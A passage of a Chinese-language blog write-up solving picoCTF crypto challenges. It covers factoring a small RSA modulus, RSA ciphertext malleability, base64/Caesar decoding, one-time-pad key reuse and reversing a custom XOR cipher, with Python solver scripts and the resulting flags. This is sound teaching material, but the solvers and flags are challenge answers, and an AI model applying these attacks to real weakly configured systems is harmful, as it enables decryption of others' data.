65537</span><br></pre></td></tr></table></figure><p>這題的敘述中告訴我們，當 e 太小的時候我們可以使用小公鑰指數攻擊(Low public exponent attack)，而題目要我們思考當 N 太小的時候我們可以如何利用。</p><p>回去看一下 RSA 加密的流程後，我們發現 N 是兩個質數的乘積，而當 N 太小的時候我們就可以暴力破解出兩個 P 跟 Q。這裡我們直接使用 FactorDB 去找 N 的因數，就可以找到 P 和 Q 了。</p><p>而有了 P 和 Q，我們就可以順著 RSA 流程找到明文 M 了，我寫了個 Python 幫我找出明文，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">long2str</span>(<span class="params">long_int: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(long_int).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">421345306292040663864066688931456845278496274597031632020995583473619804626233684</span></span><br><span class="line">n = <span class="number">631371953793368771804570727896887140714495090919073481680274581226742748040342637</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># From Factor db find p and q</span></span><br><span class="line">f = FactorDB(n)</span><br><span class="line">f.connect()</span><br><span class="line">factors = f.get_factor_list()</span><br><span class="line">p = factors[<span class="number">0</span>]</span><br><span class="line">q = factors[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Private key: d = <span class="subst">&#123;d&#125;</span>&quot;</span>)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted message: m = <span class="subst">&#123;long2str(m)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>最後找到的明文會是一個很大的數字，這時候再用 Crypto.Util.number 的 long_to_bytes 並 decode，將其轉為字符串，就可以得到 flag 了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;sma11_N_n0_g0od_55304594&#125;</span><br></pre></td></tr></table></figure><h2 id="No-padding-no-problem"><a href="#No-padding-no-problem" class="headerlink" title="No padding, no problem"></a>No padding, no problem</h2><blockquote><p>可以先看過這篇 <a href="https://ithelp.ithome.com.tw/articles/10205727">Day 14:[離散數學]同餘（Mod）是什麼？</a></p></blockquote><p>當我們把題目給的密文拿去解密，他會說<code>Will not decrypt the ciphertext. Try Again</code>。代表題目的這支程式應該是在偵測我們輸入的是否為 Ciphertext。而我們知道</p><p>$$<br>Plaintext &#x3D; c^d \mod n<br>$$</p><p>$$<br>c^d \mod n &#x3D; (c+n)^d \mod n<br>$$</p><p>所以我們利用題目給的 c 和 n 相加後，輸入到他的程式會得到:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Here you go: 290275030195850039473456618367455885069965748851278076756743720446703314517401359267322769037469251445384426639837648598397</span><br></pre></td></tr></table></figure><p>接著只要再利用 Crypto 的 long_to_bytes3 方法就可以找到明文，如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;mercury.picoctf.net&quot;</span>, <span class="number">10333</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;n:&quot;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">r.recvuntil(<span class="string">&quot;ciphertext:&quot;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">num = n + c</span><br><span class="line">r.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Here you go:&quot;</span>)</span><br><span class="line">m = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;m4yb3_Th0se_m3s54g3s_4r3_difurrent_1772735&#125;</span><br></pre></td></tr></table></figure><h2 id="interencdec"><a href="#interencdec" class="headerlink" title="interencdec"></a>interencdec</h2><p>題目給了密文 enc_flag，如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6YzRNalV3YUcxcWZRPT0nCg==</span><br></pre></td></tr></table></figure><p>因為他最後面的兩個<code>==</code>讓他看起來很像是 base64 的格式，所以就用 base64 先 Decode 一下。這邊用的是<a href="https://gchq.github.io/CyberChef/">CyberChef</a>這款工具，他可以線上進行很多種的編碼解碼、加密等等。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704163439113.png" alt="b64 decode"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzc4MjUwaG1qfQ==</span><br></pre></td></tr></table></figure><p>解碼一次後長這樣，還是很像 base64 的格式，所以我又做了一次 base64 解碼。（注意：這邊要把前面的 b 拿掉，只留引號中的內容）</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704163700571.png" alt="b64 decode"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpjvJAM&#123;jhlzhy_k3jy9wa3k_78250hmj&#125;</span><br></pre></td></tr></table></figure><p>再解碼一次後變成了這樣的形狀，看起來已經有 Flag 的雛型了（因為大括號），所以猜測它是某種置換密碼。就用最普遍的凱薩密碼來暴力解解看吧！Exploit 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = <span class="built_in">input</span>(<span class="string">&quot;Enter the encrypted flag: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">27</span>):</span><br><span class="line">    dec_flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> enc_flag:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            <span class="keyword">if</span> char.isupper():</span><br><span class="line">                dec_flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>) - i) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dec_flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) - i) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dec_flag += char</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;pico&quot;</span> <span class="keyword">in</span> dec_flag.lower():</span><br><span class="line">        <span class="built_in">print</span>(dec_flag)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;caesar_d3cr9pt3d_78250afc&#125;</span><br></pre></td></tr></table></figure><h2 id="Easy-peasy"><a href="#Easy-peasy" class="headerlink" title="Easy peasy"></a>Easy peasy</h2><blockquote><p>想了解 OTP 可以去看看這個 <a href="https://zh.wikipedia.org/zh-tw/%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A2%BC%E6%9C%AC">一次性密碼本</a></p></blockquote><p>先看題目。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">******************Welcome to our OTP implementation!******************</span><br><span class="line">This is the encrypted flag!</span><br><span class="line">551e6c4c5e55644b56566d1b5100153d4004026a4b52066b4a5556383d4b0007</span><br><span class="line"></span><br><span class="line">What data would you like to encrypt?</span><br></pre></td></tr></table></figure><p>在這題中，我們要先閱讀他給我們的 Code。在 encrypt 函式中我們可以看到一些事情。因為題目給的 Cipher 的長度為 64，又因為他是以十六進制的方式輸出 Cipher，所以我們可以知道他用掉的<code>key_location</code>長度為 32，也就是說，我們下次在加密的時候是用第 33 位開始的 key。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def encrypt(key_location):</span><br><span class="line">    ui = input(&quot;What data would you like to encrypt? &quot;).rstrip()</span><br><span class="line">    if len(ui) == 0 or len(ui) &gt; KEY_LEN:</span><br><span class="line">        return -1</span><br><span class="line"></span><br><span class="line">    start = key_location  # 這裡從32開始</span><br><span class="line">    stop = key_location + len(ui)</span><br><span class="line"></span><br><span class="line">    kf = open(KEY_FILE, &quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line">    if stop &gt;= KEY_LEN:</span><br><span class="line">        stop = stop % KEY_LEN</span><br><span class="line">        key = kf[start:] + kf[:stop]</span><br><span class="line">    else:</span><br><span class="line">        key = kf[start:stop]</span><br><span class="line">    key_location = stop</span><br><span class="line"></span><br><span class="line">    result = list(map(lambda p, k: &quot;&#123;:02x&#125;&quot;.format(ord(p) ^ k), ui, key))</span><br><span class="line"></span><br><span class="line">    print(&quot;Here ya go!\n&#123;&#125;\n&quot;.format(&quot;&quot;.join(result)))</span><br><span class="line"></span><br><span class="line">    return key_location</span><br></pre></td></tr></table></figure><p>知道了我們第一次輸入要加密的銘文是從第 32 個 key 開始後，我們要想辦法可以使用到跟題目一樣的那組 key，而在程式碼的這個區段我們可以發現一些事。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> stop &gt;= KEY_LEN:</span><br><span class="line">        stop = stop % KEY_LEN</span><br><span class="line">        key = kf[start:] + kf[:stop]</span><br></pre></td></tr></table></figure><p>在這邊，如果我們讓<code>stop</code>和<code>KEY_LEN</code>相等，讓<code>stop % KEY_LEN == 0</code>的話，<code>stop</code>就會被設定為 0，所以我們就可以讓 one-time pad 被重複使用了！所以我們先輸入一堆沒用的字元去填充那個區間段，讓他把第一個 50000 循環結束，再進入一次循環後我們就可以得到跟題目一樣的 key 了。</p><p>然後因為他加密的方法是用計算 XOR 的方式，所以我們可以簡單地透過再計算一次 XOR 得到明文，如下:</p><blockquote><p>$$key \oplus pt &#x3D; ct$$ $$key \oplus ct &#x3D; pt$$ $$pt \oplus ct &#x3D; key$$</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii  <span class="comment"># binascii.unhexlify() is used to convert hex to binary</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">50000</span> - <span class="number">32</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;mercury.picoctf.net&quot;</span>, <span class="number">11188</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">encrypted_flag = r.recvline().strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypted_flag)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;?&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;A&quot;</span> * offset)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;?&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;A&quot;</span> * <span class="number">32</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">encoded = r.recvline().strip()</span><br><span class="line">encoded = binascii.unhexlify(encoded)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;A&quot;</span> * <span class="number">32</span></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encoded)):</span><br><span class="line">    key.append(<span class="built_in">ord</span>(message[i]) ^ encoded[i])</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line">encrypted_flag = binascii.unhexlify(encrypted_flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_flag)):</span><br><span class="line">    flag.append(<span class="built_in">chr</span>(key[i] ^ encrypted_flag[i]))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="Custom-encryption"><a href="#Custom-encryption" class="headerlink" title="Custom encryption"></a>Custom encryption</h2><p>這題給了兩個檔案。一個是加密後的 flag，裡面還包含了加密需要的一些變量；另一個是加密腳本。既然給了腳本，那就先來看看 Code 吧。我結合了題目給的加密後的 flag 的資訊，把註解直接寫在了代碼裡面，看看吧！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generator</span>(<span class="params">g, x, p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(g, x) % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文 = 明文的每個字元ASCII碼 * 密鑰 * 311並append到一個list</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> plaintext:</span><br><span class="line">        cipher.append(((<span class="built_in">ord</span>(char) * key * <span class="number">311</span>)))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">p</span>):</span><br><span class="line">    v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, p + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> p % i == <span class="number">0</span>:</span><br><span class="line">            v = v + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamic_xor_encrypt</span>(<span class="params">plaintext, text_key</span>):</span><br><span class="line">    cipher_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    key_length = <span class="built_in">len</span>(text_key)</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext[::-<span class="number">1</span>]):  <span class="comment"># 從明文的末尾開始</span></span><br><span class="line">        key_char = text_key[i % key_length]  <span class="comment"># 循環text_key裡面每個字元</span></span><br><span class="line">        encrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ <span class="built_in">ord</span>(key_char))  <span class="comment"># 對應的密文 = 明文 ^ 密鑰</span></span><br><span class="line">        cipher_text += encrypted_char</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">plain_text, text_key</span>):</span><br><span class="line">    p = <span class="number">97</span></span><br><span class="line">    g = <span class="number">31</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_prime(p) <span class="keyword">and</span> <span class="keyword">not</span> is_prime(g):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Enter prime numbers&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    a = randint(p - <span class="number">10</span>, p)</span><br><span class="line">    b = randint(g - <span class="number">10</span>, g)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># a = 89</span></span><br><span class="line">    <span class="comment"># b = 27</span></span><br><span class="line">    <span class="comment"># p = 97</span></span><br><span class="line">    <span class="comment"># g = 31</span></span><br><span class="line">    u = generator(g, a, p)  <span class="comment"># u = 31 ** 89 % 97 = 49</span></span><br><span class="line">    v = generator(g, b, p)  <span class="comment"># u = 31** 27 % 97 = 85</span></span><br><span class="line">    key = generator(v, a, p)  <span class="comment"># key = 85 ** 89 % 97 = 12</span></span><br><span class="line">    b_key = generator(u, b, p)  <span class="comment"># b_key = 49 ** 27 % 97 = 12</span></span><br><span class="line">    shared_key = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> key == b_key:</span><br><span class="line">        shared_key = key  <span class="comment"># shared_key = 12</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid key&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    semi_cipher = dynamic_xor_encrypt(plain_text, text_key)</span><br><span class="line">    cipher = encrypt(semi_cipher, shared_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;cipher is: <span class="subst">&#123;cipher&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    message = sys.argv[<span class="number">1</span>]</span><br><span class="line">    test(message, <span class="string">&quot;trudeau&quot;</span>)</span><br></pre></td></tr></table></figure><p>由上面的代碼可以知道，它是經過了兩次的加密，一次是把明文反過來並讓其對<code>text_key</code>循環做 XOR，第二次是把第一次加密得到的東西轉 ASCII 並乘以 key 再乘以 311。</p><p>解密的話就反過來，先去除以 311 再除以 key（這裡為 12），得到一個半密文（semi_cipher）。接下來這個半密文要先反轉，再用它寫好的 function 去做 XOR（因為它的 function 裡面又有一次反轉，所以這樣剛好會是和加密時相同的順序），最後得到的這個明文還要再反轉一次，才會得到正確的 flag。至於為甚麼要反轉兩次，解釋如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">假設題目的dynamic_xor_encrypt為f，明文為ABC</span><br><span class="line"></span><br><span class="line">加密：</span><br><span class="line">f(ABC, KEY) = C&#x27;B&#x27;A&#x27;</span><br><span class="line"></span><br><span class="line">解密：</span><br><span class="line">第一次反轉，把C&#x27;B&#x27;A變為A&#x27;B&#x27;C，所以在f裡就會計算C&#x27;B&#x27;A對KEY的XOR</span><br><span class="line">f(A&#x27;B&#x27;C, KEY) = CBA</span><br><span class="line">第二次反轉，把CBA轉為ABC</span><br><span class="line">flag = ABC</span><br></pre></td></tr></table></figure><p>希望這樣解釋有比較清楚一點！總之照這樣解密就可以得到 flag 啦，以下是我的解密的代碼：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher: <span class="built_in">list</span>, key: <span class="built_in">int</span>, text_key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    semi_cipher = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> encrypted_value <span class="keyword">in</span> cipher:</span><br><span class="line">        decrypted_value = encrypted_value // (key * <span class="number">311</span>)  <span class="comment"># 使用 // 返回int</span></span><br><span class="line">        semi_cipher += <span class="built_in">chr</span>(decrypted_value)</span><br><span class="line">    semi_cipher = semi_cipher[::-<span class="number">1</span>]  <span class="comment"># 將密文反轉</span></span><br><span class="line">    plaintext = dynamic_xor_encrypt(semi_cipher, text_key)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = [</span><br><span class="line">    <span class="number">33588</span>,</span><br><span class="line">    <span class="number">276168</span>,</span><br><span class="line">    <span class="number">261240</span>,</span><br><span class="line">    <span class="number">302292</span>,</span><br><span class="line">    <span class="number">343344</span>,</span><br><span class="line">    <span class="number">328416</span>,</span><br><span class="line">    <span class="number">242580</span>,</span><br><span class="line">    <span class="number">85836</span>,</span><br><span class="line">    <span class="number">82104</span>,</span><br><span class="line">    <span class="number">156744</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">309756</span>,</span><br><span class="line">    <span class="number">78372</span>,</span><br><span class="line">    <span class="number">18660</span>,</span><br><span class="line">    <span class="number">253776</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">82104</span>,</span><br><span class="line">    <span class="number">320952</span>,</span><br><span class="line">    <span class="number">3732</span>,</span><br><span class="line">    <span class="number">231384</span>,</span><br><span class="line">    <span class="number">89568</span>,</span><br><span class="line">    <span class="number">100764</span>,</span><br><span class="line">    <span class="number">22392</span>,</span><br><span class="line">    <span class="number">22392</span>,</span><br><span class="line">    <span class="number">63444</span>,</span><br><span class="line">    <span class="number">22392</span>,</span><br><span class="line">    <span class="number">97032</span>,</span><br><span class="line">    <span class="number">190332</span>,</span><br><span class="line">    <span class="number">119424</span>,</span><br><span class="line">    <span class="number">182868</span>,</span><br><span class="line">    <span class="number">97032</span>,</span><br><span class="line">    <span class="number">26124</span>,</span><br><span class="line">    <span class="number">44784</span>,</span><br><span class="line">    <span class="number">63444</span>,</span><br><span class="line">]</span><br><span class="line">plaintext = decrypt(cipher, <span class="number">12</span>, <span class="string">&quot;trudeau&quot;</span>)  <span class="comment"># since we know the key is 12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;plaintext is: <span class="subst">&#123;plaintext[::-<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;custom_d2cr0pt6d_dc499538&#125;</span><br></pre></td></tr></table></figure><h2 id="Mini-RSA"><a href="#Mini-RSA" class="headerlink" title="Mini RSA"></a>Mini RSA</h2><p>題目給了一組 RSA 加密的密文，還有公鑰（n, e），如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N: 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287</span><br><span class="line">e: 3</span><br><span class="line"></span><br><span class="line">ciphertext (c): 